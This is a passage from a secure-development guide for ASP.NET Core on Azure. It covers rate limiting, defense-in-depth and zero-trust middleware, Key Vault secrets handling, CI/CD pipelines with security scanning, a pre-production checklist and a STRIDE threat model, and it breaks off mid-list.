                TokensPerPeriod = 1000,
                AutoReplenishment = true
            });
        });

        // 2. Authentication endpoints (strict)
        options.AddPolicy("Authentication", context =>
        {
            var ipAddress = context.Connection.RemoteIpAddress?.ToString() ?? "unknown";

            return RateLimitPartition.GetSlidingWindowLimiter(ipAddress, _ => new SlidingWindowRateLimiterOptions
            {
                PermitLimit = 5,
                Window = TimeSpan.FromMinutes(15),
                SegmentsPerWindow = 3,
                QueueProcessingOrder = QueueProcessingOrder.OldestFirst,
                QueueLimit = 0
            });
        });

        // 3. API endpoints (moderate)
        options.AddPolicy("Api", context =>
        {
            var userId = context.User.FindFirstValue(ClaimTypes.NameIdentifier) ?? "anonymous";

            return RateLimitPartition.GetFixedWindowLimiter(userId, _ => new FixedWindowRateLimiterOptions
            {
                PermitLimit = 100,
                Window = TimeSpan.FromMinutes(1),
                QueueProcessingOrder = QueueProcessingOrder.OldestFirst,
                QueueLimit = 10
            });
        });

        // 4. Expensive operations (very strict)
        options.AddPolicy("ExpensiveOperation", context =>
        {
            var userId = context.User.FindFirstValue(ClaimTypes.NameIdentifier) ?? "anonymous";

            return RateLimitPartition.GetConcurrencyLimiter(userId, _ => new ConcurrencyLimiterOptions
            {
                PermitLimit = 2,
                QueueProcessingOrder = QueueProcessingOrder.OldestFirst,
                QueueLimit = 5
            });
        });

        // Custom rejection response
        options.OnRejected = async (context, token) =>
        {
            context.HttpContext.Response.StatusCode = StatusCodes.Status429TooManyRequests;

            if (context.Lease.TryGetMetadata(MetadataName.RetryAfter, out var retryAfter))
            {
                context.HttpContext.Response.Headers.RetryAfter = retryAfter.TotalSeconds.ToString();
            }

            await context.HttpContext.Response.WriteAsJsonAsync(new
            {
                error = "Too many requests",
                message = "Rate limit exceeded. Please try again later.",
                retryAfter = retryAfter?.TotalSeconds
            }, token);

            // Log rate limit violations
            var logger = context.HttpContext.RequestServices.GetRequiredService<ILogger<Program>>();
            logger.LogWarning(
                "Rate limit exceeded for {UserId} on {Endpoint}",
                context.HttpContext.User.FindFirstValue(ClaimTypes.NameIdentifier) ?? "Anonymous",
                context.HttpContext.Request.Path);
        };
    });
}

// Usage
[HttpPost("login")]
[EnableRateLimiting("Authentication")]
public async Task<IActionResult> Login(LoginRequest request)
{
    // Login logic
}

[HttpGet("data")]
[EnableRateLimiting("Api")]
[Authorize]
public async Task<IActionResult> GetData()
{
    // API logic
}

[HttpPost("report")]
[EnableRateLimiting("ExpensiveOperation")]
[Authorize]
public async Task<IActionResult> GenerateReport()
{
    // Expensive operation
}
```

### Distributed Rate Limiting (Redis)

```csharp
public class RedisRateLimiter
{
    private readonly IDatabase _redis;

    public async Task<bool> IsAllowedAsync(
        string key,
        int maxRequests,
        TimeSpan window)
    {
        var now = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
        var windowStart = now - (long)window.TotalSeconds;

        // Remove old entries
        await _redis.SortedSetRemoveRangeByScoreAsync(
            key,
            double.NegativeInfinity,
            windowStart);

        // Count requests in window
        var requestCount = await _redis.SortedSetLengthAsync(key);

        if (requestCount < maxRequests)
        {
            // Add current request
            await _redis.SortedSetAddAsync(key, now, now);
            await _redis.KeyExpireAsync(key, window);
            return true;
        }

        return false;
    }

    // Token bucket implementation
    public async Task<bool> TryConsumeTokenAsync(
        string key,
        int capacity,
        int refillRate,
        TimeSpan refillInterval)
    {
        var script = @"
            local key = KEYS[1]
            local capacity = tonumber(ARGV[1])
            local refill_rate = tonumber(ARGV[2])
            local refill_interval = tonumber(ARGV[3])
            local now = tonumber(ARGV[4])

            local bucket = redis.call('HMGET', key, 'tokens', 'last_refill')
            local tokens = tonumber(bucket[1]) or capacity
            local last_refill = tonumber(bucket[2]) or now

            local elapsed = now - last_refill
            local refill_count = math.floor(elapsed / refill_interval) * refill_rate
            tokens = math.min(capacity, tokens + refill_count)

            if tokens >= 1 then
                tokens = tokens - 1
                redis.call('HMSET', key, 'tokens', tokens, 'last_refill', now)
                redis.call('EXPIRE', key, 3600)
                return 1
            else
                return 0
            end
        ";

        var result = await _redis.ScriptEvaluateAsync(
            script,
            new RedisKey[] { key },
            new RedisValue[]
            {
                capacity,
                refillRate,
                (int)refillInterval.TotalSeconds,
                DateTimeOffset.UtcNow.ToUnixTimeSeconds()
            });

        return (int)result == 1;
    }
}
```

---

## 7. Defense in Depth Strategy

### Layered Security Architecture

```
┌─────────────────────────────────────────────────────────────┐
│ Layer 7: User Education & Awareness                         │
│ - Security training, phishing awareness                     │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│ Layer 6: Application Security                               │
│ - Input validation, output encoding, authentication         │
│ - Authorization, session management, error handling         │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│ Layer 5: Data Security                                      │
│ - Encryption at rest, encryption in transit                 │
│ - Data classification, data loss prevention                 │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│ Layer 4: Endpoint Security                                  │
│ - Anti-malware, host-based firewall                         │
│ - Patch management, device encryption                       │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│ Layer 3: Network Security                                   │
│ - Firewalls, Network Segmentation, IDS/IPS                  │
│ - VPN, Private Endpoints, NSGs                              │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│ Layer 2: Perimeter Security                                 │
│ - WAF, DDoS Protection, Azure Front Door                    │
│ - API Management, Rate Limiting                             │
└─────────────────────────────────────────────────────────────┘
┌─────────────────────────────────────────────────────────────┐
│ Layer 1: Physical Security                                  │
│ - Azure datacenter security (Microsoft managed)             │
└─────────────────────────────────────────────────────────────┘
```

### Implementation Example

```csharp
public class DefenseInDepthMiddleware
{
    private readonly RequestDelegate _next;

    public async Task InvokeAsync(HttpContext context)
    {
        // Layer 1: IP Filtering (Perimeter)
        if (!IsAllowedIp(context.Connection.RemoteIpAddress))
        {
            context.Response.StatusCode = 403;
            return;
        }

        // Layer 2: Rate Limiting (Network)
        if (!await CheckRateLimitAsync(context))
        {
            context.Response.StatusCode = 429;
            return;
        }

        // Layer 3: WAF-like protection (Application)
        if (ContainsMaliciousPayload(context.Request))
        {
            LogSecurityEvent("Malicious payload detected", context);
            context.Response.StatusCode = 400;
            return;
        }

        // Layer 4: Authentication (Application)
        if (!context.User.Identity?.IsAuthenticated == true &&
            RequiresAuthentication(context.Request.Path))
        {
            context.Response.StatusCode = 401;
            return;
        }

        // Layer 5: Authorization (Application)
        if (!await IsAuthorizedAsync(context))
        {
            LogSecurityEvent("Authorization failed", context);
            context.Response.StatusCode = 403;
            return;
        }

        await _next(context);

        // Layer 6: Output filtering (Data)
        if (context.Response.StatusCode == 200)
        {
            // Ensure no sensitive data in response headers
            SanitizeResponseHeaders(context.Response);
        }
    }
}
```

---

## 8. Secrets Management Patterns

### Azure Key Vault Integration

```csharp
public class Program
{
    public static void Main(string[] args)
    {
        CreateHostBuilder(args).Build().Run();
    }

    public static IHostBuilder CreateHostBuilder(string[] args) =>
        Host.CreateDefaultBuilder(args)
            .ConfigureAppConfiguration((context, config) =>
            {
                if (context.HostingEnvironment.IsProduction())
                {
                    var builtConfig = config.Build();

                    // Add Key Vault as configuration provider
                    config.AddAzureKeyVault(
                        new Uri($"https://{builtConfig["KeyVaultName"]}.vault.azure.net/"),
                        new DefaultAzureCredential(),
                        new KeyVaultSecretManager());
                }
            })
            .ConfigureWebHostDefaults(webBuilder =>
            {
                webBuilder.UseStartup<Startup>();
            });
}

// Custom secret manager for environment-specific secrets
public class EnvironmentKeyVaultSecretManager : KeyVaultSecretManager
{
    private readonly string _environment;

    public EnvironmentKeyVaultSecretManager(string environment)
    {
        _environment = environment.ToLower();
    }

    public override bool Load(SecretProperties secret)
    {
        // Only load secrets for current environment
        // Secret naming: Production--ConnectionStrings--Database
        return secret.Name.StartsWith($"{_environment}--", StringComparison.OrdinalIgnoreCase);
    }

    public override string GetKey(KeyVaultSecret secret)
    {
        // Remove environment prefix: Production--ConnectionStrings--Database
        // Returns: ConnectionStrings:Database
        return secret.Name
            .Substring($"{_environment}--".Length)
            .Replace("--", ConfigurationPath.KeyDelimiter);
    }
}
```

### Secret Rotation

```csharp
public class SecretRotationService : IHostedService
{
    private readonly SecretClient _secretClient;
    private readonly ILogger<SecretRotationService> _logger;
    private Timer _timer;

    public Task StartAsync(CancellationToken cancellationToken)
    {
        // Check for expiring secrets every hour
        _timer = new Timer(CheckSecretExpiration, null, TimeSpan.Zero, TimeSpan.FromHours(1));
        return Task.CompletedTask;
    }

    private async void CheckSecretExpiration(object state)
    {
        try
        {
            await foreach (var secretProperties in _secretClient.GetPropertiesOfSecretsAsync())
            {
                if (secretProperties.ExpiresOn.HasValue)
                {
                    var daysUntilExpiry = (secretProperties.ExpiresOn.Value - DateTimeOffset.UtcNow).TotalDays;

                    if (daysUntilExpiry <= 30 && daysUntilExpiry > 0)
                    {
                        _logger.LogWarning(
                            "Secret {SecretName} expires in {Days} days",
                            secretProperties.Name,
                            Math.Round(daysUntilExpiry));

                        await NotifySecretExpirationAsync(secretProperties.Name, (int)daysUntilExpiry);
                    }
                    else if (daysUntilExpiry <= 7)
                    {
                        _logger.LogError(
                            "Secret {SecretName} expires in {Days} days - URGENT",
                            secretProperties.Name,
                            Math.Round(daysUntilExpiry));

                        await TriggerSecretRotationAsync(secretProperties.Name);
                    }
                }
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Error checking secret expiration");
        }
    }

    private async Task TriggerSecretRotationAsync(string secretName)
    {
        // Trigger automated rotation for supported secrets
        if (secretName.Contains("SqlPassword"))
        {
            await RotateSqlPasswordAsync(secretName);
        }
        else if (secretName.Contains("ApiKey"))
        {
            await RotateApiKeyAsync(secretName);
        }
    }

    public Task StopAsync(CancellationToken cancellationToken)
    {
        _timer?.Change(Timeout.Infinite, 0);
        return Task.CompletedTask;
    }
}
```

### Secure Configuration

```csharp
// appsettings.json (no secrets!)
{
  "ConnectionStrings": {
    "Database": "@Microsoft.KeyVault(SecretUri=https://myvault.vault.azure.net/secrets/DbConnection/)"
  },
  "ExternalApi": {
    "BaseUrl": "https://api.external.com",
    "ApiKey": "@Microsoft.KeyVault(SecretUri=https://myvault.vault.azure.net/secrets/ExternalApiKey/)"
  }
}

// Environment variables (for local development)
// Use dotnet user-secrets for local development
dotnet user-secrets init
dotnet user-secrets set "ConnectionStrings:Database" "Server=localhost;Database=MyDb;..."
dotnet user-secrets set "ExternalApi:ApiKey" "dev-api-key"

// Startup.cs
public class Startup
{
    public Startup(IConfiguration configuration)
    {
        Configuration = configuration;
    }

    public IConfiguration Configuration { get; }

    public void ConfigureServices(IServiceCollection services)
    {
        // Configuration automatically resolves Key Vault references
        services.AddDbContext<ApplicationDbContext>(options =>
            options.UseSqlServer(Configuration.GetConnectionString("Database")));

        services.AddHttpClient<IExternalApiClient, ExternalApiClient>((client) =>
        {
            client.BaseAddress = new Uri(Configuration["ExternalApi:BaseUrl"]);
            client.DefaultRequestHeaders.Add("X-API-Key", Configuration["ExternalApi:ApiKey"]);
        });
    }
}
```

---

## 9. Secure CI/CD Pipelines

### Azure DevOps Pipeline Security

```yaml
# azure-pipelines.yml
trigger:
  branches:
    include:
    - main
    - develop
  paths:
    exclude:
    - docs/*
    - README.md

variables:
- group: Production-Secrets  # Variable group in Azure DevOps (secured)
- name: buildConfiguration
  value: 'Release'

pool:
  vmImage: 'ubuntu-latest'

stages:
- stage: SecurityScanning
  jobs:
  - job: StaticAnalysis
    steps:
    # Credential scanning
    - task: CredScan@3
      inputs:
        toolMajorVersion: 'V2'
        suppressionsFile: '$(Build.SourcesDirectory)/credscan-suppressions.json'

    # Dependency vulnerability scanning
    - task: WhiteSource@21
      inputs:
        cwd: '$(Build.SourcesDirectory)'
        projectName: 'MyProject'

    # Static code analysis
    - task: SonarCloudPrepare@1
      inputs:
        SonarCloud: 'SonarCloud'
        organization: 'myorg'
        scannerMode: 'MSBuild'
        projectKey: 'myproject'

    - task: DotNetCoreCLI@2
      displayName: 'Build'
      inputs:
        command: 'build'
        projects: '**/*.csproj'
        arguments: '--configuration $(buildConfiguration)'

    - task: SonarCloudAnalyze@1

    - task: SonarCloudPublish@1
      inputs:
        pollingTimeoutSec: '300'

    # Security code scan
    - task: SecurityCodeScan@3

    # Check for secrets in code
    - script: |
        echo "Scanning for secrets..."
        docker run --rm -v $(Build.SourcesDirectory):/path trufflesecurity/trufflehog:latest github --repo=file:///path
      displayName: 'Secret Detection'

- stage: Build
  dependsOn: SecurityScanning
  jobs:
  - job: BuildAndTest
    steps:
    - task: UseDotNet@2
      inputs:
        version: '8.x'

    - task: DotNetCoreCLI@2
      displayName: 'Restore'
      inputs:
        command: 'restore'
        projects: '**/*.csproj'
        feedsToUse: 'select'
        vstsFeed: 'myorg/myfeed'

    - task: DotNetCoreCLI@2
      displayName: 'Build'
      inputs:
        command: 'build'
        projects: '**/*.csproj'
        arguments: '--configuration $(buildConfiguration) --no-restore'

    - task: DotNetCoreCLI@2
      displayName: 'Test'
      inputs:
        command: 'test'
        projects: '**/*Tests.csproj'
        arguments: '--configuration $(buildConfiguration) --no-build --collect:"XPlat Code Coverage"'

    - task: PublishCodeCoverageResults@1
      inputs:
        codeCoverageTool: 'Cobertura'
        summaryFileLocation: '$(Agent.TempDirectory)/**/coverage.cobertura.xml'

    # Fail build if code coverage < 80%
    - script: |
        coverage=$(grep -oP 'line-rate="\K[^"]+' $(Agent.TempDirectory)/**/coverage.cobertura.xml | head -1)
        if (( $(echo "$coverage < 0.8" | bc -l) )); then
          echo "Code coverage ($coverage) is below 80%"
          exit 1
        fi
      displayName: 'Check Code Coverage'

    - task: DotNetCoreCLI@2
      displayName: 'Publish'
      inputs:
        command: 'publish'
        publishWebProjects: true
        arguments: '--configuration $(buildConfiguration) --output $(Build.ArtifactStagingDirectory)'
        zipAfterPublish: true

    # Sign assemblies
    - task: EsrpCodeSigning@2
      inputs:
        ConnectedServiceName: 'ESRP'
        FolderPath: '$(Build.ArtifactStagingDirectory)'
        Pattern: '*.dll,*.exe'
        signConfigType: 'inlineSignParams'

    - task: PublishBuildArtifacts@1
      inputs:
        PathtoPublish: '$(Build.ArtifactStagingDirectory)'
        ArtifactName: 'drop'

- stage: DeployDev
  dependsOn: Build
  condition: and(succeeded(), eq(variables['Build.SourceBranch'], 'refs/heads/develop'))
  jobs:
  - deployment: DeployToDev
    environment: 'Development'
    strategy:
      runOnce:
        deploy:
          steps:
          - task: AzureWebApp@1
            inputs:
              azureSubscription: 'Azure-Dev'
              appType: 'webAppLinux'
              appName: 'myapp-dev'
              package: '$(Pipeline.Workspace)/drop/*.zip'
              deploymentMethod: 'zipDeploy'

          # Run security tests
          - task: OWASP-ZAP@1
            inputs:
              aggressivemode: false
              threshold: '50'
              scantype: 'targetedScan'
              url: 'https://myapp-dev.azurewebsites.net'

- stage: DeployProd
  dependsOn: Build
  condition: and(succeeded(), eq(variables['Build.SourceBranch'], 'refs/heads/main'))
  jobs:
  - deployment: DeployToProd
    environment: 'Production'  # Requires approval
    strategy:
      runOnce:
        deploy:
          steps:
          # Deploy to staging slot
          - task: AzureWebApp@1
            inputs:
              azureSubscription: 'Azure-Prod'
              appType: 'webAppLinux'
              appName: 'myapp-prod'
              package: '$(Pipeline.Workspace)/drop/*.zip'
              deployToSlotOrASE: true
              resourceGroupName: 'myapp-rg'
              slotName: 'staging'

          # Warm-up period
          - script: |
              for i in {1..10}; do
                curl -f https://myapp-prod-staging.azurewebsites.net/health || exit 1
                sleep 5
              done
            displayName: 'Health Check'

          # Swap slots (blue-green deployment)
          - task: AzureAppServiceManage@0
            inputs:
              azureSubscription: 'Azure-Prod'
              action: 'Swap Slots'
              webAppName: 'myapp-prod'
              resourceGroupName: 'myapp-rg'
              sourceSlot: 'staging'

          # Monitor for errors (15 minutes)
          - script: |
              sleep 900
              error_rate=$(curl -s https://myapp-prod.azurewebsites.net/metrics/error-rate)
              if (( $(echo "$error_rate > 0.01" | bc -l) )); then
                echo "High error rate detected: $error_rate"
                exit 1
              fi
            displayName: 'Monitor Post-Deployment'

          # Rollback on failure
          - task: AzureAppServiceManage@0
            condition: failed()
            inputs:
              azureSubscription: 'Azure-Prod'
              action: 'Swap Slots'
              webAppName: 'myapp-prod'
              resourceGroupName: 'myapp-rg'
              sourceSlot: 'staging'
            displayName: 'Rollback'
```

### GitHub Actions Security

```yaml
name: Secure CI/CD

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

permissions:
  contents: read
  security-events: write

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
      with:
        fetch-depth: 0

    # Secret scanning
    - name: Gitleaks scan
      uses: gitleaks/gitleaks-action@v2
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

    # Dependency scanning
    - name: Run Snyk
      uses: snyk/actions/dotnet@master
      env:
        SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
      with:
        args: --severity-threshold=high

    # CodeQL analysis
    - name: Initialize CodeQL
      uses: github/codeql-action/init@v2
      with:
        languages: csharp

    - name: Autobuild
      uses: github/codeql-action/autobuild@v2

    - name: Perform CodeQL Analysis
      uses: github/codeql-action/analyze@v2

  build:
    needs: security-scan
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3

    - name: Setup .NET
      uses: actions/setup-dotnet@v3
      with:
        dotnet-version: '8.0.x'

    - name: Restore
      run: dotnet restore

    - name: Build
      run: dotnet build --configuration Release --no-restore

    - name: Test
      run: dotnet test --configuration Release --no-build --collect:"XPlat Code Coverage"

    - name: Publish
      run: dotnet publish --configuration Release --output ./publish

    - name: Upload artifact
      uses: actions/upload-artifact@v3
      with:
        name: app
        path: ./publish

  deploy:
    needs: build
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://myapp-prod.azurewebsites.net
    steps:
    - name: Download artifact
      uses: actions/download-artifact@v3
      with:
        name: app
        path: ./publish

    - name: Azure Login
      uses: azure/login@v1
      with:
        creds: ${{ secrets.AZURE_CREDENTIALS }}

    - name: Deploy to Azure Web App
      uses: azure/webapps-deploy@v2
      with:
        app-name: 'myapp-prod'
        package: './publish'
        slot-name: 'staging'

    - name: Swap slots
      run: |
        az webapp deployment slot swap \
          --resource-group myapp-rg \
          --name myapp-prod \
          --slot staging \
          --target-slot production
```

---

##10. Zero Trust Principles

### Zero Trust Architecture

```
Traditional Security (Perimeter-based):
┌────────────────────────────────────────┐
│  Firewall                              │
│  ┌──────────────────────────────────┐  │
│  │ Inside = Trusted                 │  │
│  │ - Full access                    │  │
│  │ - Minimal verification           │  │
│  └──────────────────────────────────┘  │
└────────────────────────────────────────┘

Zero Trust (Never Trust, Always Verify):
┌────────────────────────────────────────┐
│  Every Request Verified                │
│  ┌────────────────────────────────┐    │
│  │ Verify Identity                │    │
│  │ Verify Device                  │    │
│  │ Verify Access Rights           │    │
│  │ Verify Context                 │    │
│  │ Least Privilege                │    │
│  │ Assume Breach                  │    │
│  └────────────────────────────────┘    │
└────────────────────────────────────────┘
```

### Implementing Zero Trust

```csharp
public class ZeroTrustMiddleware
{
    private readonly RequestDelegate _next;
    private readonly IAuthorizationService _authorizationService;

    public async Task InvokeAsync(HttpContext context)
    {
        // 1. Verify Identity (Authentication)
        if (!context.User.Identity?.IsAuthenticated == true)
        {
            context.Response.StatusCode = 401;
            return;
        }

        // 2. Verify Device (Device compliance)
        if (!await IsDeviceCompliantAsync(context))
        {
            await LogSecurityEvent("Non-compliant device", context);
            context.Response.StatusCode = 403;
            await context.Response.WriteAsJsonAsync(new
            {
                error = "Device not compliant. Please ensure your device meets security requirements."
            });
            return;
        }

        // 3. Verify Location (Geo-fencing)
        if (!IsAllowedLocation(context))
        {
            await LogSecurityEvent("Access from restricted location", context);
            context.Response.StatusCode = 403;
            return;
        }

        // 4. Verify Time (Time-based access)
        if (!IsWithinAllowedTime(context))
        {
            context.Response.StatusCode = 403;
            return;
        }

        // 5. Verify Risk Score
        var riskScore = await CalculateRiskScoreAsync(context);
        if (riskScore > 70)  // High risk
        {
            // Require step-up authentication
            if (!await HasRecentMfaAsync(context))
            {
                context.Response.StatusCode = 403;
                await context.Response.WriteAsJsonAsync(new
                {
                    error = "Step-up authentication required",
                    mfaRequired = true
                });
                return;
            }
        }

        // 6. Least Privilege Access
        var resource = GetRequestedResource(context);
        var authResult = await _authorizationService.AuthorizeAsync(
            context.User,
            resource,
            GetRequiredPolicy(context));

        if (!authResult.Succeeded)
        {
            await LogSecurityEvent("Insufficient privileges", context);
            context.Response.StatusCode = 403;
            return;
        }

        // 7. Log all access (Assume Breach)
        await LogAccessAsync(context, resource);

        await _next(context);

        // 8. Re-verify on sensitive operations
        if (IsSensitiveOperation(context))
        {
            await RequireAdditionalVerificationAsync(context);
        }
    }

    private async Task<bool> IsDeviceCompliantAsync(HttpContext context)
    {
        var deviceId = context.Request.Headers["X-Device-Id"].ToString();

        if (string.IsNullOrEmpty(deviceId))
        {
            return false;
        }

        // Check device compliance with Intune/MDM
        var device = await GetDeviceInformationAsync(deviceId);

        return device != null &&
               device.IsManaged &&
               device.IsCompliant &&
               device.OSVersion >= "10.0.0";
    }

    private async Task<int> CalculateRiskScoreAsync(HttpContext context)
    {
        var score = 0;

        // Unusual location?
        if (await IsUnusualLocationAsync(context))
        {
            score += 30;
        }

        // Unusual time?
        if (IsUnusualTimeAsync(context))
        {
            score += 20;
        }

        // New device?
        if (await IsNewDeviceAsync(context))
        {
            score += 25;
        }

        // High-risk IP?
        if (await IsHighRiskIpAsync(context))
        {
            score += 40;
        }

        // Recent failed login attempts?
        if (await HasRecentFailedAttemptsAsync(context))
        {
            score += 15;
        }

        return score;
    }

    private async Task LogAccessAsync(HttpContext context, object resource)
    {
        var accessLog = new
        {
            UserId = context.User.FindFirstValue(ClaimTypes.NameIdentifier),
            Resource = resource.ToString(),
            Action = context.Request.Method,
            IpAddress = context.Connection.RemoteIpAddress?.ToString(),
            UserAgent = context.Request.Headers.UserAgent.ToString(),
            Timestamp = DateTime.UtcNow
        };

        // Store in SIEM or audit log
        await StoreAuditLogAsync(accessLog);
    }
}
```

### Conditional Access Policies

```csharp
public class ConditionalAccessHandler : AuthorizationHandler<ConditionalAccessRequirement>
{
    private readonly IHttpContextAccessor _httpContextAccessor;
    private readonly IGraphServiceClient _graphClient;

    protected override async Task HandleRequirementAsync(
        AuthorizationHandlerContext context,
        ConditionalAccessRequirement requirement)
    {
        var httpContext = _httpContextAccessor.HttpContext;
        var userId = context.User.FindFirstValue(ClaimTypes.NameIdentifier);

        // Get user's group memberships
        var groups = await _graphClient.Users[userId]
            .MemberOf
            .Request()
            .GetAsync();

        // Check if user is in high-privilege group
        var isHighPrivilege = groups.Any(g =>
            ((Group)g).DisplayName == "Administrators" ||
            ((Group)g).DisplayName == "Finance");

        if (isHighPrivilege)
        {
            // Require MFA within last 15 minutes
            var lastMfa = context.User.FindFirstValue("amr");
            if (lastMfa != "mfa")
            {
                context.Fail();
                return;
            }

            // Require managed device
            var deviceId = httpContext.Request.Headers["X-Device-Id"].ToString();
            var isManaged = await IsDeviceManagedAsync(deviceId);

            if (!isManaged)
            {
                context.Fail();
                return;
            }

            // Require compliant device
            var isCompliant = await IsDeviceCompliantAsync(deviceId);

            if (!isCompliant)
            {
                context.Fail();
                return;
            }
        }

        context.Succeed(requirement);
    }

    private async Task<bool> IsDeviceManagedAsync(string deviceId)
    {
        try
        {
            var device = await _graphClient.Devices[deviceId]
                .Request()
                .GetAsync();

            return device.IsManaged == true;
        }
        catch
        {
            return false;
        }
    }

    private async Task<bool> IsDeviceCompliantAsync(string deviceId)
    {
        try
        {
            var device = await _graphClient.Devices[deviceId]
                .Request()
                .GetAsync();

            return device.IsCompliant == true;
        }
        catch
        {
            return false;
        }
    }
}
```

---

## 11. Security Checklist

### Pre-Production Security Checklist

```markdown
## Authentication & Authorization
- [ ] All endpoints require authentication (except explicitly public)
- [ ] Authorization checks use policies, not inline checks
- [ ] JWT tokens have appropriate expiration (15 min access, 7-90 days refresh)
- [ ] Refresh token rotation is implemented
- [ ] Multi-factor authentication is enforced for admin accounts
- [ ] Password policy enforces complexity and length requirements
- [ ] Account lockout is configured after failed login attempts
- [ ] Session timeout is configured appropriately

## Data Protection
- [ ] All sensitive data encrypted at rest (TDE for SQL, encryption for storage)
- [ ] All data encrypted in transit (HTTPS/TLS 1.2+)
- [ ] Connection strings stored in Key Vault, not appsettings
- [ ] API keys and secrets stored in Key Vault
- [ ] Managed Identity used for Azure service authentication
- [ ] Data classification implemented
- [ ] PII data is properly masked in logs

## Input Validation
- [ ] All user input is validated (client and server-side)
- [ ] Parameterized queries used (no string concatenation)
- [ ] File upload size and type restrictions enforced
- [ ] File content verification (magic bytes check)
- [ ] XML external entity (XXE) protection enabled
- [ ] JSON deserialization uses safe settings

## Security Headers
- [ ] HSTS enabled with appropriate max-age
- [ ] Content Security Policy (CSP) configured
- [ ] X-Content-Type-Options: nosniff
- [ ] X-Frame-Options: DENY or SAMEORIGIN
- [ ] Referrer-Policy configured
- [ ] Permissions-Policy configured
- [ ] Server header removed

## CORS
- [ ] CORS policy is restrictive (not AllowAny in production)
- [ ] Allowed origins explicitly whitelisted
- [ ] Credentials only allowed for trusted origins

## Rate Limiting
- [ ] Global rate limiting configured
- [ ] Per-endpoint rate limiting for sensitive operations
- [ ] Authentication endpoints have strict rate limits

## Error Handling
- [ ] Detailed error messages disabled in production
- [ ] Generic error messages returned to clients
- [ ] Errors logged with sufficient detail for debugging
- [ ] Stack traces never exposed to clients

## Logging & Monitoring
- [ ] All authentication attempts logged
- [ ] All authorization failures logged
- [ ] Sensitive data access logged
- [ ] Security events logged
- [ ] Logs sent to centralized logging (Application Insights)
- [ ] Alerts configured for security events

## Dependencies
- [ ] All NuGet packages up to date
- [ ] Vulnerable dependencies identified and remediated
- [ ] Dependency scanning in CI/CD pipeline
- [ ] License compliance checked

## Network Security
- [ ] Private endpoints used for Azure services
- [ ] Network Security Groups (NSGs) configured
- [ ] Azure Firewall or WAF deployed
- [ ] DDoS protection enabled
- [ ] API Management policies configured

## Code Security
- [ ] Static code analysis (SonarQube) passing
- [ ] Security code scan (CodeQL) passing
- [ ] No hardcoded secrets in code
- [ ] No commented-out sensitive code
- [ ] Code review completed

## Deployment Security
- [ ] Deployment uses Managed Identity
- [ ] Deployment slots used for zero-downtime deployment
- [ ] Health checks configured
- [ ] Rollback plan documented
- [ ] Secrets not in source control

## Compliance
- [ ] GDPR requirements met (if applicable)
- [ ] HIPAA requirements met (if applicable)
- [ ] PCI DSS requirements met (if applicable)
- [ ] Data retention policies implemented
- [ ] Right to be forgotten implemented

## Testing
- [ ] Security tests in test suite
- [ ] OWASP ZAP scan completed
- [ ] Penetration testing completed
- [ ] Load testing completed
```

---

## 12. Threat Modeling

### STRIDE Threat Model

```
STRIDE Framework:
- Spoofing (Identity)
- Tampering (Data)
- Repudiation (Actions)
- Information Disclosure (Confidentiality)
- Denial of Service (Availability)
- Elevation of Privilege (Authorization)
```

### Threat Modeling Process

```csharp
public class ThreatModel
{
    // Example: E-commerce Order API

    // 1. Decompose Application
    public class ApplicationArchitecture
    {
        // Entry Points
        public List<string> EntryPoints = new()
        {
            "Web UI (React SPA)",
            "Mobile App (iOS/Android)",
            "REST API",
            "Admin Portal"
        };

        // Assets
        public List<string> Assets = new()
        {
            "Customer PII",
            "Payment information",
            "Order history",
            "Authentication tokens",
            "API keys"
        };

        // Trust Boundaries
        public List<string> TrustBoundaries = new()
        {
            "Internet → Azure Front Door",
            "Azure Front Door → App Service",
            "App Service → SQL Database",
            "App Service → Payment Gateway (external)",
            "User Browser → SPA"
        };
    }

    // 2. Identify Threats
    public class Threats
    {
        public List<Threat> IdentifiedThreats = new()
        {
            new Threat
            {
                Id = "T001",
                Type = ThreatType.Spoofing,
                Description = "Attacker impersonates legitimate user",
                Asset = "User account",
                Mitigation = "Multi-factor authentication, strong password policy",
                Severity = "High"
            },
            new Threat
            {
                Id = "T002",
                Type = ThreatType.Tampering,
                Description = "Attacker modifies order data in transit",
                Asset = "Order data",
                Mitigation = "HTTPS/TLS encryption, integrity checks",
                Severity = "High"
            },
            new Threat
            {
                Id = "T003",
                Type = ThreatType.Repudiation,
                Description = "User denies placing order",
                Asset = "Order history",
                Mitigation = "Comprehensive audit logging, digital signatures",
                Severity = "Medium"
            },
            new Threat
            {
                Id = "T004",
                Type = ThreatType.InformationDisclosure,
                Description = "Attacker gains access to customer PII",
                Asset = "Customer database",
                Mitigation = "Encryption at rest, least privilege access, data masking",
                Severity = "Critical"
            },
            new Threat
            {
                Id = "T005",
                Type = ThreatType.DenialOfService,
                Description = "Attacker floods API with requests",
                Asset = "API availability",
                Mitigation = "Rate limiting, DDoS protection, auto-scaling",
                Severity = "High"
            },
            new Threat
            {
                Id = "T006",
                Type = ThreatType.ElevationOfPrivilege,
                Description = "Regular user gains admin access",
                Asset = "Admin functionality",
                Mitigation = "Role-based access control, least privilege principle",
                Severity = "Critical"
            }
        };
    }

    // 3. Mitigations
    public class Mitigations
    {
        public Dictionary<string, List<string>> ImplementedMitigations = new()
        {
            ["Spoofing"] = new List<string>
            {
                "Azure AD B2C with MFA",
                "OAuth 2.0 with PKCE",
                "Certificate-based authentication for service accounts",
                "Account lockout after failed attempts"
            },
            ["Tampering"] = new List<string>
            {
                "HTTPS/TLS 1.3 for all connections",
                "HMAC signatures for API requests",
                "Input validation and sanitization",
                "Database integrity constraints"
            },
            ["Repudiation"] = new List<string>
            {
                "Comprehensive audit logging",
                "Digital signatures for transactions",
                "Immutable append-only logs",
                "Log retention for 7 years"
            },
            ["Information Disclosure"] = new List<string>
            {
